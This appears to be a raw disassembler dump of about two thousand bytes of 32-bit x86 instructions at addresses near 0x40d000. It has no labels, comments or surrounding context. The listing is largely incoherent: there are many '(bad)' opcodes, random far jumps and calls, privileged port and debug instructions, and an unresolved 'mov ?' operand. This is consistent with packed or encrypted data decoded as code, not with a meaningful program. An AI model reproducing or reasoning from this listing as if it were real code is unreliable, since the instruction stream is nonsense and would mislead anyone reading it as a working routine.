  40cf98:	mov    al,ds:0xbd9597ac
  40cf9d:	rcr    ebx,1
  40cf9f:	xor    ch,BYTE PTR [ebx+0x1f]
  40cfa2:	sbb    al,0x41
  40cfa4:	mov    al,ds:0xf1699d9d
  40cfa9:	fiadd  DWORD PTR [eax]
  40cfab:	sbb    edx,eax
  40cfad:	xchg   ebp,eax
  40cfae:	sub    DWORD PTR [edi-0x11f55f4e],esp
  40cfb4:	adc    BYTE PTR [eax],cl
  40cfb6:	pop    ebp
  40cfb7:	adc    bl,BYTE PTR [ebx+esi*1+0x350691cf]
  40cfbe:	(bad)
  40cfc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfc2:	dec    esi
  40cfc3:	or     esp,DWORD PTR [eax]
  40cfc5:	pop    edx
  40cfc6:	sub    eax,0xa1867432
  40cfcb:	sub    BYTE PTR ds:0xdd40492c,dl
  40cfd1:	repz mov ds:0x9ac1e5f,al
  40cfd7:	mov    ds:0x86459101,eax
  40cfdc:	mov    ch,0xe9
  40cfde:	lock mov ebx,0xe55c1eb3
  40cfe4:	mov    edx,0x96b22a1c
  40cfe9:	cld    
  40cfea:	inc    BYTE PTR [ebp-0x318b0a3f]
  40cff0:	aas    
  40cff1:	nop
  40cff2:	or     BYTE PTR [ecx+0x6b],cl
  40cff5:	popf   
  40cff6:	sub    DWORD PTR [edi],eax
  40cff8:	xchg   DWORD PTR [eax],edx
  40cffa:	mov    edi,0xdc21cdd4
  40cfff:	inc    edx
  40d000:	xor    DWORD PTR [ebp-0x24fee593],edi
  40d006:	jmp    0x343e:0x3631fbe
  40d00d:	test   DWORD PTR [ecx+0x4ae41d0c],edi
  40d013:	scas   al,BYTE PTR es:[edi]
  40d014:	or     ebx,ecx
  40d016:	adc    al,0x90
  40d018:	mov    DWORD PTR [esi+0x5f66a6a6],edx
  40d01e:	dec    esi
  40d01f:	inc    esi
  40d020:	aas    
  40d021:	ins    DWORD PTR es:[edi],dx
  40d022:	or     DWORD PTR [ecx],esi
  40d024:	dec    eax
  40d025:	lds    ebx,FWORD PTR [ecx+0x4c]
  40d028:	ja     0x40cfdb
  40d02a:	repnz popf 
  40d02c:	popa   
  40d02d:	dec    edx
  40d02e:	pushf  
  40d02f:	cmp    eax,0x3ad61a69
  40d034:	arpl   WORD PTR [esi-0x62],bx
  40d037:	sbb    eax,0xde9c4e7e
  40d03c:	jle    0x40d066
  40d03e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d03f:	arpl   WORD PTR [edi+eiz*8],cx
  40d042:	dec    edi
  40d043:	cwde   
  40d044:	stos   DWORD PTR es:[edi],eax
  40d045:	jmp    0x6cb7:0xbd56f54d
  40d04c:	call   0xb94e:0x2717fd17
  40d053:	sbb    BYTE PTR [ecx],ch
  40d055:	xchg   esi,eax
  40d056:	sar    ebp,cl
  40d058:	sub    DWORD PTR [eax],edi
  40d05a:	or     bl,0x4e
  40d05d:	mul    ch
  40d05f:	fimul  WORD PTR [esi-0x26]
  40d062:	es nop
  40d064:	and    eax,0x75c285b
  40d069:	mov    esi,0xc9371463
  40d06e:	mov    ah,0x7b
  40d070:	and    DWORD PTR [ecx-0x9],eax
  40d073:	out    0xd8,eax
  40d075:	sub    ah,dl
  40d077:	mov    eax,0x64d9442b
  40d07c:	(bad)
  40d07f:	sbb    DWORD PTR [eax],0xd60f9b5c
  40d085:	scas   eax,DWORD PTR es:[edi]
  40d086:	mov    DWORD PTR [esi-0x71a4bf7f],esp
  40d08c:	or     edi,DWORD PTR [edi]
  40d08e:	adc    eax,ebx
  40d090:	xor    al,0x26
  40d092:	inc    esp
  40d093:	imul   ebx,DWORD PTR [esi],0x626013be
  40d099:	adc    DWORD PTR [eax],ecx
  40d09b:	ficom  DWORD PTR [ebx-0x76]
  40d09e:	mov    bl,0x9b
  40d0a0:	mov    WORD PTR [ebx+0x2d],cs
  40d0a3:	sbb    ebx,DWORD PTR [edx]
  40d0a5:	xor    BYTE PTR [edi-0x430f4fa7],dl
  40d0ab:	add    ecx,ebx
  40d0ad:	arpl   dx,di
  40d0af:	or     al,0x7b
  40d0b1:	sub    BYTE PTR [ebx+0x60ffa4cd],bh
  40d0b7:	dec    edi
  40d0b8:	outs   dx,BYTE PTR ds:[esi]
  40d0b9:	jle    0x40d0b5
  40d0bb:	cmp    BYTE PTR [edx],0x2e
  40d0be:	sbb    eax,0x3a245525
  40d0c3:	xchg   edi,ebp
  40d0c5:	jo     0x40d102
  40d0c7:	(bad)  
  40d0c8:	aaa    
  40d0c9:	xlat   BYTE PTR ds:[ebx]
  40d0ca:	xchg   esi,eax
  40d0cb:	mov    DWORD PTR [ebp+0x5cf1808b],edx
  40d0d1:	or     DWORD PTR [ebx+0x47],eax
  40d0d4:	(bad)  
  40d0d6:	ret    0xa69c
  40d0d9:	popf   
  40d0da:	ja     0x40d153
  40d0dc:	jecxz  0x40d134
  40d0de:	mov    BYTE PTR [esi+ebx*2],0xa
  40d0e2:	je     0x40d0aa
  40d0e4:	lods   eax,DWORD PTR ds:[esi]
  40d0e5:	aam    0xb4
  40d0e7:	cld    
  40d0e8:	sub    DWORD PTR [eax+0x2d],ebx
  40d0eb:	sbb    BYTE PTR [ebp+0x13],ch
  40d0ee:	sar    DWORD PTR [ebp-0x73a7d152],1
  40d0f4:	pop    ds
  40d0f5:	mov    gs,ebp
  40d0f7:	data16 cmp al,0xd8
  40d0fa:	xchg   BYTE PTR [eax],cl
  40d0fc:	mov    al,dh
  40d0fe:	es lahf 
  40d100:	mov    ecx,0xa1157c8b
  40d105:	sbb    DWORD PTR [edi-0x3285388],ecx
  40d10b:	scas   eax,DWORD PTR es:[edi]
  40d10c:	ins    DWORD PTR es:[edi],dx
  40d10d:	jg     0x40d0ad
  40d10f:	shl    DWORD PTR [eax+0x67],1
  40d112:	into   
  40d113:	leave  
  40d114:	icebp  
  40d115:	jmp    0x40d0d7
  40d117:	push   cs
  40d118:	jne    0x40d14d
  40d11a:	mov    bh,0x5a
  40d11c:	mov    ds:0xdd6be7f5,al
  40d121:	icebp  
  40d122:	mov    edx,0x42a3c41e
  40d127:	js     0x40d0f6
  40d129:	dec    ecx
  40d12a:	dec    BYTE PTR [ebp-0x71]
  40d12d:	repz pop ds
  40d12f:	inc    ebx
  40d130:	push   es
  40d131:	jle    0x40d0f7
  40d133:	xchg   esp,eax
  40d134:	int    0xb
  40d136:	sub    bl,ah
  40d138:	push   0xd72e8db6
  40d13d:	mov    eax,ds:0x2c4c9aa3
  40d142:	xchg   ebx,eax
  40d143:	hlt    
  40d144:	inc    esp
  40d145:	or     ebp,ecx
  40d147:	retf   0x4302
  40d14a:	jecxz  0x40d1a3
  40d14c:	ret    
  40d14d:	out    0x79,eax
  40d14f:	jmp    0xd731fb11
  40d154:	sbb    eax,0x3ab2923b
  40d159:	mov    ebx,0xdecc4a5c
  40d15e:	push   ss
  40d15f:	adc    BYTE PTR [edx],dl
  40d161:	int    0x5c
  40d163:	sub    ah,BYTE PTR [esi]
  40d165:	cvtdq2ps xmm4,XMMWORD PTR [edi]
  40d168:	mov    ebp,0x49eed93d
  40d16d:	lods   eax,DWORD PTR ds:[esi]
  40d16e:	xlat   BYTE PTR ds:[ebx]
  40d16f:	pop    DWORD PTR [ecx+esi*8]
  40d172:	fs ins BYTE PTR es:[edi],dx
  40d174:	iret   
  40d175:	imul   edi,ecx,0x7036b539
  40d17b:	cmp    al,0x3d
  40d17d:	dec    esp
  40d17e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d17f:	inc    esp
  40d180:	adc    al,0x56
  40d182:	push   es
  40d183:	inc    ecx
  40d184:	scas   al,BYTE PTR es:[edi]
  40d185:	xor    DWORD PTR [edi+0x2f9f913c],ecx
  40d18b:	(bad)  
  40d18c:	int3   
  40d18d:	enter  0xd9fa,0x9c
  40d191:	fidivr WORD PTR [ecx+0x0]
  40d194:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d195:	leave  
  40d196:	adc    eax,ebx
  40d198:	call   0x3b56:0x3b8fa483
  40d19f:	mov    DWORD PTR [eax+eiz*8-0x2b],eax
  40d1a3:	cli    
  40d1a4:	pop    esi
  40d1a5:	imul   ebx,DWORD PTR [edx-0x4bc74955],0x4d
  40d1ac:	int    0xbd
  40d1ae:	xchg   BYTE PTR [edi-0x60f6a77d],cl
  40d1b4:	or     ecx,DWORD PTR [esi+edx*1]
  40d1b7:	ror    BYTE PTR [eax],1
  40d1b9:	cmp    al,0xeb
  40d1bb:	sbb    BYTE PTR [ecx],0xc7
  40d1be:	and    eax,0x941b82a1
  40d1c3:	cdq    
  40d1c4:	mov    WORD PTR [ebx+0x8ced09b],ds
  40d1ca:	mov    ch,0xcd
  40d1cc:	jnp    0x40d150
  40d1ce:	cmc    
  40d1cf:	mov    ah,0xcb
  40d1d1:	adc    cl,BYTE PTR ds:0xe6c0ec2
  40d1d7:	mov    eax,ds:0xe562e09e
  40d1dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1de:	push   ebp
  40d1df:	lock jae 0x40d246
  40d1e2:	jb     0x40d228
  40d1e4:	ret    
  40d1e5:	je     0x40d1ea
  40d1e7:	mov    DWORD PTR ds:0xc1a70dbf,ebp
  40d1ed:	xor    dl,BYTE PTR [ecx]
  40d1ef:	scas   eax,DWORD PTR es:[edi]
  40d1f0:	and    al,0xdb
  40d1f2:	cmp    eax,0xb5d1b8dd
  40d1f7:	mov    dh,0x95
  40d1f9:	or     al,0x78
  40d1fb:	inc    esp
  40d1fc:	jmp    0x40d180
  40d1fe:	pop    ecx
  40d1ff:	out    0xf8,al
  40d201:	dec    eax
  40d202:	jb     0x40d1dd
  40d204:	or     eax,0xe1ae838
  40d209:	and    esi,DWORD PTR [ecx-0x7]
  40d20c:	fadd   QWORD PTR [ebx+0x76]
  40d20f:	ja     0x40d1fc
  40d211:	das    
  40d212:	lods   eax,DWORD PTR ds:[esi]
  40d213:	(bad)  
  40d214:	lock call 0x2c82e919
  40d21a:	stos   DWORD PTR es:[edi],eax
  40d21b:	es or  eax,0x5c09695a
  40d221:	aas    
  40d222:	dec    ecx
  40d223:	push   esp
  40d224:	cmp    dh,0xde
  40d227:	ja     0x40d22c
  40d229:	outs   dx,DWORD PTR ds:[esi]
  40d22a:	xchg   ebx,eax
  40d22b:	inc    edx
  40d22c:	daa    
  40d22d:	xchg   BYTE PTR [ebx+eax*1+0x1d13cf60],bh
  40d234:	(bad)  
  40d235:	mov    edi,0xba0581db
  40d23a:	jo     0x40d1e4
  40d23c:	mov    bh,0x23
  40d23e:	lds    esp,FWORD PTR [ecx+esi*2-0x6b60314f]
  40d245:	add    esp,0x890f82e3
  40d24b:	pop    edx
  40d24c:	aam    0x64
  40d24e:	cmp    BYTE PTR [ecx+0x17],al
  40d251:	jo     0x40d1f2
  40d253:	std    
  40d254:	dec    edi
  40d255:	inc    eax
  40d256:	in     al,0xa2
  40d258:	out    0x3d,eax
  40d25a:	sub    BYTE PTR [ecx-0x1f],bh
  40d25d:	ret    
  40d25e:	fs mov cl,0xae
  40d261:	sbb    ebx,DWORD PTR [esi+0x40c5b5b3]
  40d267:	push   ss
  40d268:	repz ret 0x5ad5
  40d26c:	cmp    BYTE PTR [ebx-0x64],ch
  40d26f:	cli    
  40d270:	dec    edi
  40d271:	cmc    
  40d272:	push   edi
  40d273:	aam    0x5f
  40d275:	push   0xbe70c6f8
  40d27a:	cmp    al,0x14
  40d27c:	jbe    0x40d22f
  40d27e:	pushf  
  40d27f:	xor    al,0xb3
  40d281:	fdiv   QWORD PTR [edi]
  40d283:	push   ebx
  40d284:	mov    ebx,DWORD PTR [ecx]
  40d286:	mov    ecx,0xc79899c4
  40d28b:	jmp    0x976cd918
  40d290:	jecxz  0x40d232
  40d292:	pop    esi
  40d293:	dec    edi
  40d294:	mov    ds:0x2f0cda95,eax
  40d299:	or     DWORD PTR [bx+di],0xdca3e76d
  40d2a0:	dec    esp
  40d2a1:	mov    bl,BYTE PTR [esi]
  40d2a3:	jg     0x40d280
  40d2a5:	shr    DWORD PTR [esi],0x8f
  40d2a8:	outs   dx,BYTE PTR ds:[esi]
  40d2a9:	(bad)  
  40d2aa:	sub    DWORD PTR [ebp+0x43],ebp
  40d2ad:	jns    0x40d314
  40d2af:	shl    DWORD PTR [ebx+0x33901f],1
  40d2b5:	nop
  40d2b6:	ins    DWORD PTR es:[edi],dx
  40d2b7:	jo     0x40d30b
  40d2b9:	ja     0x40d298
  40d2bb:	test   BYTE PTR [edx],al
  40d2bd:	sub    dl,0x1e
  40d2c0:	imul   edi,DWORD PTR [ebp-0x35393849],0xfc6091e4
  40d2ca:	(bad)  
  40d2cb:	in     eax,dx
  40d2cc:	shl    DWORD PTR [esi],0x26
  40d2cf:	scas   al,BYTE PTR es:[edi]
  40d2d0:	dec    esp
  40d2d1:	jl     0x40d31c
  40d2d3:	dec    esi
  40d2d4:	cmp    dl,BYTE PTR [esi]
  40d2d6:	cld    
  40d2d7:	fstp   TBYTE PTR [ebx+0x2fc6412b]
  40d2dd:	nop
  40d2de:	sbb    cl,BYTE PTR [esi+ebp*1-0x60b814f0]
  40d2e5:	push   es
  40d2e6:	mov    edi,0xd7943451
  40d2eb:	lods   al,BYTE PTR ds:[esi]
  40d2ec:	rcl    DWORD PTR [ebx-0x5eb7cd98],0x4d
  40d2f3:	cs inc eax
  40d2f5:	cwde   
  40d2f6:	shr    DWORD PTR [ecx+0x6577ba75],0xf5
  40d2fd:	add    DWORD PTR [eax+0x1f],ebx
  40d300:	fisubr DWORD PTR [edx+0x44]
  40d303:	jae    0x40d356
  40d305:	mov    ebp,0x97a3832d
  40d30a:	push   ebx
  40d30b:	aas    
  40d30c:	mov    eax,ds:0x518c7458
  40d311:	mov    edx,0x4b4f7b5e
  40d316:	test   al,0xb8
  40d318:	mov    ah,0x42
  40d31a:	inc    DWORD PTR [ecx+0x15e80314]
  40d320:	clc    
  40d321:	push   ebp
  40d322:	ss es jge 0x40d2b3
  40d326:	ficom  DWORD PTR [eax+0x5648ebf7]
  40d32c:	inc    eax
  40d32d:	xchg   ecx,eax
  40d32e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d32f:	push   esp
  40d330:	mov    ds:0x59528074,eax
  40d335:	mov    DWORD PTR [esi],ebx
  40d337:	nop
  40d338:	ss jle 0x40d2c9
  40d33b:	lahf   
  40d33c:	jecxz  0x40d360
  40d33e:	or     DWORD PTR [edx+0x4cc3cf4b],ecx
  40d344:	fwait
  40d345:	mov    bl,0x9
  40d347:	ret    0xa33a
  40d34a:	cmc    
  40d34b:	cmp    eax,0xbd151382
  40d350:	inc    ecx
  40d351:	mov    edx,0xb4f0bfab
  40d356:	arpl   WORD PTR [eax-0x4b71dfbf],sp
  40d35c:	jmp    0x40d330
  40d35e:	sbb    ch,al
  40d360:	(bad)  
  40d361:	mov    al,0xbc
  40d363:	adc    ecx,DWORD PTR [edx]
  40d365:	and    al,0x41
  40d367:	mov    cl,0x92
  40d369:	lea    eax,[eax-0x58]
  40d36c:	inc    edx
  40d36d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d36e:	sub    al,dl
  40d370:	push   ecx
  40d371:	xor    eax,ebp
  40d373:	or     cl,BYTE PTR fs:[edi+0x3e]
  40d377:	test   DWORD PTR [esp+eax*4+0x7d03de79],esp
  40d37e:	aam    0x38
  40d380:	adc    eax,0x541266aa
  40d385:	pop    ds
  40d386:	popf   
  40d387:	sub    eax,0xdc512d29
  40d38c:	das    
  40d38d:	inc    ebp
  40d38e:	outs   dx,DWORD PTR ds:[esi]
  40d38f:	loop   0x40d40d
  40d391:	mov    al,0xc7
  40d393:	js     0x40d377
  40d395:	repz pop ebx
  40d397:	jl     0x40d3de
  40d399:	pop    es
  40d39a:	ficomp WORD PTR [ecx+0x4b]
  40d39d:	add    DWORD PTR [ebx+0x2b],ebp
  40d3a0:	sub    dl,BYTE PTR [edi]
  40d3a2:	ret    
  40d3a3:	stos   DWORD PTR es:[edi],eax
  40d3a4:	push   esp
  40d3a5:	js     0x40d3f3
  40d3a7:	(bad)  [edi-0x2b]
  40d3aa:	or     ebp,DWORD PTR [ebx-0x731a6818]
  40d3b0:	jno    0x40d41b
  40d3b2:	jnp    0x40d3fc
  40d3b4:	and    ch,dl
  40d3b6:	ror    edi,cl
  40d3b8:	fdivr  st,st(4)
  40d3ba:	jnp    0x40d38a
  40d3bc:	imul   ebx,ebp,0xffffffad
  40d3bf:	adc    al,0xbf
  40d3c1:	sub    BYTE PTR [ecx],0x6f
  40d3c4:	ret    0x4aa5
  40d3c7:	pop    edx
  40d3c8:	and    al,0x6e
  40d3ca:	xchg   ecx,eax
  40d3cb:	iret   
  40d3cc:	(bad)  
  40d3cd:	in     eax,dx
  40d3ce:	mov    eax,ds:0xb93cf188
  40d3d3:	mov    ch,0x52
  40d3d5:	not    DWORD PTR [eax]
  40d3d7:	and    eax,0xa192c20b
  40d3dc:	inc    edi
  40d3dd:	jne    0x40d413
  40d3df:	jp     0x40d3e6
  40d3e1:	or     eax,0xe3c5f17c
  40d3e6:	enter  0x60b,0xfb
  40d3ea:	pop    edx
  40d3eb:	push   edi
  40d3ec:	(bad)  
  40d3ed:	sbb    al,0xdf
  40d3ef:	mov    edi,ecx
  40d3f1:	scas   al,BYTE PTR es:[edi]
  40d3f2:	jg     0x40d38e
  40d3f4:	sub    esp,DWORD PTR [ecx+esi*1]
  40d3f7:	add    al,0x28
  40d3f9:	inc    edx
  40d3fa:	pop    ebp
  40d3fb:	inc    esi
  40d3fc:	add    cl,BYTE PTR [ecx-0x5f]
  40d3ff:	nop
  40d400:	sar    edi,1
  40d402:	test   esi,ebp
  40d404:	xchg   BYTE PTR [ecx-0x44],dh
  40d407:	enter  0x85d,0x82
  40d40b:	cmp    bl,ch
  40d40d:	sub    al,0x6a
  40d40f:	lds    esi,FWORD PTR [edx+0x36476169]
  40d415:	mov    ds,WORD PTR [edx-0x11]
  40d418:	or     al,0x39
  40d41a:	mov    eax,ds:0x599497e5
  40d41f:	iret   
  40d420:	jmp    0x40d3ca
  40d422:	mov    eax,0x7dcb64e7
  40d427:	sbb    al,0x41
  40d429:	xor    al,0x38
  40d42b:	lds    eax,FWORD PTR [ebx*1+0x7b225658]
  40d432:	xchg   ebp,eax
  40d433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d434:	pop    esi
  40d435:	fiadd  DWORD PTR [esi]
  40d437:	xchg   edx,eax
  40d438:	arpl   WORD PTR ds:0xb565afbc,bp
  40d43e:	adc    cl,BYTE PTR [ecx-0x145617c8]
  40d444:	xchg   edi,eax
  40d445:	push   ebp
  40d446:	(bad)  
  40d447:	enter  0xe5ae,0x8f
  40d44b:	mov    cs,WORD PTR [edi]
  40d44d:	ins    DWORD PTR es:[edi],dx
  40d44e:	call   0x3e9a1a26
  40d453:	fwait
  40d454:	sti    
  40d455:	mov    edi,0x366094eb
  40d45a:	cmp    DWORD PTR [eax-0x78],esi
  40d45d:	mov    al,0xc5
  40d45f:	ret    0xe05f
  40d462:	leave  
  40d463:	js     0x40d4bb
  40d465:	xor    esp,DWORD PTR [ecx+0x21]
  40d468:	pop    es
  40d469:	and    esp,DWORD PTR [ecx+0x21]
  40d46c:	or     eax,0xd4343352
  40d471:	mov    al,BYTE PTR [esi]
  40d473:	inc    ebx
  40d474:	mov    ?,WORD PTR ds:0x4dc8d0ed
  40d47a:	add    dh,BYTE PTR [ebx+0x1e]
  40d47d:	mov    ebp,0x23a720f3
  40d482:	loope  0x40d412
  40d484:	imul   esp,esi,0x2981be56
  40d48a:	adc    eax,0xe08bab4f
  40d48f:	fmul   QWORD PTR [ebp+0x51]
  40d492:	push   0x9165eabe
	...
  40d513:	add    BYTE PTR [eax],dl
  40d515:	mov    eax,0xdfff9ff7
  40d51a:	js     0x40d4db
  40d51c:	shl    BYTE PTR [ebx-0x5e],cl
  40d51f:	mov    ds:0x777d4211,al
  40d524:	aad    0x83
  40d526:	add    BYTE PTR [eax],al
  40d528:	imul   eax,DWORD PTR [edi],0x0
  40d52b:	add    BYTE PTR [edx-0x208b49ae],ch
  40d531:	mov    ebp,0xca5eb9f7
  40d536:	dec    esi
  40d537:	outs   dx,BYTE PTR ds:[esi]
  40d538:	test   BYTE PTR [edi],al
  40d53a:	push   edi
  40d53b:	push   ecx
  40d53c:	hlt    
  40d53d:	mov    al,ds:0xee351801
  40d542:	fwait
  40d543:	inc    ebx
  40d544:	in     al,0xdb
  40d546:	cmc    
  40d547:	loopne 0x40d52c
  40d549:	adc    dh,BYTE PTR [ebx+0x7d]
  40d54c:	add    bh,dl
  40d54e:	sub    eax,0xba186c91
  40d553:	dec    esp
  40d554:	test   eax,edi
  40d556:	or     al,0xec
  40d558:	and    eax,0xed5cb0ae
  40d55d:	mov    esp,0xc5500025
  40d562:	cmp    ecx,DWORD PTR [edi+0x54]
  40d565:	cwde   
  40d566:	pop    ecx
  40d567:	das    
  40d568:	gs mov ebp,0xaa29d5bd
  40d56e:	call   0xc559474f
  40d573:	cli    
  40d574:	ret    0xdcbd
  40d577:	shl    DWORD PTR [esi-0x2403accb],0x4f
  40d57e:	mov    eax,ds:0x8241b86a
  40d583:	or     edi,DWORD PTR [esi+0x59906220]
  40d589:	aaa    
  40d58a:	xor    bh,BYTE PTR [esi]
  40d58c:	xor    DWORD PTR [ecx],0x7e274e1
  40d592:	dec    esi
  40d593:	cmp    eax,0xf6df9b4c
  40d598:	sub    al,0xaa
  40d59a:	lock xchg edx,eax
  40d59c:	(bad)  
  40d59d:	addr16 aad 0x76
  40d5a0:	scas   al,BYTE PTR es:[edi]
  40d5a1:	xchg   BYTE PTR [edx],bl
  40d5a3:	inc    ebp
  40d5a4:	shr    BYTE PTR [edx+0xdc36af2],1
  40d5aa:	push   esi
  40d5ab:	jno    0x40d555
  40d5ad:	das    
  40d5ae:	ret    
  40d5af:	pop    es
  40d5b0:	cld    
  40d5b1:	dec    esi
  40d5b2:	xlat   BYTE PTR ds:[ebx]
  40d5b3:	cli    
  40d5b4:	adc    eax,0x15ec0e8f
  40d5b9:	mov    BYTE PTR [esi],cl
  40d5bb:	out    0xe9,eax
  40d5bd:	fsubr  DWORD PTR [ebp+0x3a]
  40d5c0:	test   BYTE PTR [edi+ecx*2-0x33],0xb5
  40d5c5:	mov    dh,0x31
  40d5c7:	pop    ecx
  40d5c8:	arpl   dx,di
  40d5ca:	fxch   st(7)
  40d5cc:	jle    0x40d5ba
  40d5ce:	adc    DWORD PTR [esi],esi
  40d5d0:	stos   DWORD PTR es:[edi],eax
  40d5d1:	or     ch,BYTE PTR [ecx-0x1b69cd3d]
  40d5d7:	push   edi
  40d5d8:	mov    cl,0xa3
  40d5da:	add    al,0xc4
  40d5dc:	mov    ds:0x496d766f,al
  40d5e1:	out    0xce,al
  40d5e3:	outs   dx,BYTE PTR ds:[esi]
  40d5e4:	push   esp
  40d5e5:	mov    dl,0x38
  40d5e7:	std    
  40d5e8:	pop    ebx
  40d5e9:	mov    ebp,0xe9fab851
  40d5ee:	adc    cl,cl
  40d5f0:	scas   al,BYTE PTR es:[edi]
  40d5f1:	jg     0x40d5c8
  40d5f3:	jb     0x40d5cf
  40d5f5:	mov    ds:0x66e37860,al
  40d5fa:	loope  0x40d64e
  40d5fc:	test   ah,ch
  40d5fe:	xchg   esp,eax
  40d5ff:	jmp    0x40d64c
  40d601:	jle    0x40d58e
  40d603:	popa   
  40d604:	cmp    bl,BYTE PTR [edi]
  40d606:	pop    ecx
  40d607:	gs ins DWORD PTR es:[edi],dx
  40d609:	jno    0x40d5cf
  40d60b:	push   edi
  40d60c:	sub    ch,bh
  40d60e:	cmc    
  40d60f:	pop    edi
  40d610:	mov    bh,0x80
  40d612:	in     al,dx
  40d613:	dec    ecx
  40d614:	and    edx,DWORD PTR [ebp-0x65]
  40d617:	push   edx
  40d618:	shr    ecx,cl
  40d61a:	(bad)  
  40d61b:	in     al,0x46
  40d61d:	xlat   BYTE PTR ds:[ebx]
  40d61e:	inc    ebp
  40d61f:	push   eax
  40d620:	jmp    0x40d658
  40d622:	cmp    esp,DWORD PTR [eax-0x79d01af0]
  40d628:	inc    edx
  40d629:	sub    al,0x7
  40d62b:	xadd   DWORD PTR [ecx-0x7d28c473],edi
  40d632:	pop    edx
  40d633:	jne    0x40d617
  40d635:	add    eax,0x48cd1c6b
  40d63a:	shl    edx,0x33
  40d63d:	dec    esi
  40d63e:	mov    ds:0x26dcf674,eax
  40d643:	shl    ah,0x4f
  40d646:	and    esp,DWORD PTR [eax+0xc1e3882]
  40d64c:	shl    DWORD PTR [esi+0x47],0x5b
  40d650:	aad    0x73
  40d652:	or     al,0xb4
  40d654:	sbb    dl,BYTE PTR [esi+0x7d]
  40d657:	mov    ebp,0xf756afb4
  40d65c:	popa   
  40d65d:	cmc    
  40d65e:	clc    
  40d65f:	fidivr DWORD PTR ds:0xb4b6f27b
  40d665:	cmp    al,0x6b
  40d667:	jno    0x40d680
  40d669:	iret   
  40d66a:	aad    0x3a
  40d66c:	outs   dx,BYTE PTR ds:[esi]
  40d66d:	mov    ds:0xf10e808d,al
  40d672:	dec    eax
  40d673:	ret    
  40d674:	retf   0xafd2
  40d677:	cmp    DWORD PTR [ecx-0x1a3da70e],0x4c
  40d67e:	sbb    bh,cl
  40d680:	adc    ebx,DWORD PTR [eax-0x6f]
  40d683:	aaa    
  40d684:	ret    
  40d685:	iret   
  40d686:	dec    edi
  40d687:	xchg   ebx,eax
  40d688:	inc    ecx
  40d689:	push   esi
  40d68a:	fwait
  40d68b:	cld    
  40d68c:	cwde   
  40d68d:	mov    edx,0x656a73bf
  40d692:	(bad)  
  40d693:	mov    eax,ds:0x7a8ebd48
  40d698:	push   ss
  40d699:	clc    
  40d69a:	mov    cl,dh
  40d69c:	addr16 dec ecx
  40d69e:	or     DWORD PTR [edx],eax
  40d6a0:	xor    al,0x35
  40d6a2:	aaa    
  40d6a3:	mov    esi,0x72023adb
  40d6a8:	jmp    FWORD PTR [ebp-0x55]
  40d6ab:	inc    ecx
  40d6ac:	and    BYTE PTR [esi-0x20],bh
  40d6af:	retf   
  40d6b0:	aaa    
  40d6b1:	adc    eax,0x926e3cd0
  40d6b6:	xchg   esp,eax
  40d6b7:	stos   DWORD PTR es:[edi],eax
  40d6b8:	hlt    
  40d6b9:	sbb    DWORD PTR [ebx+0x77aa93c0],0xb41d13d1
  40d6c3:	mov    ch,0x15
  40d6c5:	mov    eax,0x28d310b6
  40d6ca:	sub    al,BYTE PTR ds:0x5563ad94
  40d6d0:	ret    0xb827
  40d6d3:	push   edi
  40d6d4:	dec    esi
  40d6d5:	popa   
  40d6d6:	jmp    0x5e2a5642
  40d6db:	loopne 0x40d69f
  40d6dd:	ja     0x40d6f5
  40d6df:	or     al,0xd3
  40d6e1:	pop    edx
  40d6e2:	ins    DWORD PTR es:[edi],dx
  40d6e3:	xchg   esp,eax
  40d6e4:	sub    al,0x2b
  40d6e6:	mov    ds:0xaef83d5a,al
  40d6eb:	not    ecx
  40d6ed:	mov    ebx,DWORD PTR [ebp+0x71cde69d]
  40d6f3:	xchg   ebx,eax
  40d6f4:	dec    edx
  40d6f5:	xor    eax,0x34114c2b
  40d6fa:	mov    ch,0x4f
  40d6fc:	in     al,dx
  40d6fd:	fwait
  40d6fe:	jmp    0x40d768
  40d700:	or     ch,BYTE PTR [esi+0x4b]
  40d703:	cdq    
  40d704:	in     al,0xcd
  40d706:	dec    esi
  40d707:	and    ah,dl
  40d709:	mov    cs,WORD PTR [ecx-0x2d52b548]
  40d70f:	xor    al,0x81
  40d711:	ficom  DWORD PTR [edi+0x4f294e00]
  40d717:	fcomp  DWORD PTR [ecx]
  40d719:	repz push esp
  40d71b:	ds and al,0xff
  40d71e:	xchg   esi,eax
  40d71f:	cld    
  40d720:	ins    BYTE PTR es:[edi],dx
  40d721:	sbb    al,0x63
  40d723:	mov    bh,0xc1
  40d725:	shl    BYTE PTR [edi-0x6b96769],1
  40d72b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d72c:	mov    ch,0x8f
  40d72e:	cld    
  40d72f:	in     al,dx
  40d730:	loopne 0x40d706
  40d732:	fld    QWORD PTR [esi-0xd]
  40d735:	popa   
  40d736:	ins    BYTE PTR es:[edi],dx
  40d737:	xchg   edx,eax
  40d738:	pop    esp
  40d739:	inc    esp
  40d73a:	sub    esp,ebx
  40d73c:	icebp  
  40d73d:	ins    DWORD PTR es:[edi],dx
  40d73e:	mov    WORD PTR [ebp-0x8],gs
  40d741:	stos   DWORD PTR es:[edi],eax
  40d742:	int    0x9b
  40d744:	or     al,0xe3
  40d746:	xor    eax,0xfe0ead3a
  40d74b:	xchg   edx,eax
  40d74c:	jmp    0xd477:0xd7b0a9fd
  40d753:	inc    eax
  40d754:	imul   eax,DWORD PTR [edi+0x8e7d9e1],0xffffffde
  40d75b:	or     eax,0xc68a81a3
  40d760:	push   eax
  40d761:	ins    BYTE PTR es:[edi],dx
  40d762:	(bad)  [edx-0x23]
  40d765:	xchg   ecx,eax
  40d766:	xor    al,0xe1
  40d768:	mov    al,ds:0x306c6c87
  40d76d:	mov    cl,0x5
  40d76f:	aaa    
  40d770:	dec    esi
  40d771:	je     0x40d7bf
  40d773:	add    BYTE PTR [esp+esi*4+0x4e84bb75],0xd9
  40d77b:	push   0x5e41dcb0
  40d780:	pop    ds
  40d781:	mov    ch,0x3
  40d783:	jnp    0x40d7d2
  40d785:	aam    0x1a
  40d787:	cmp    eax,0xc19ba665
  40d78c:	loope  0x40d765
  40d78e:	or     eax,0x1006a66e
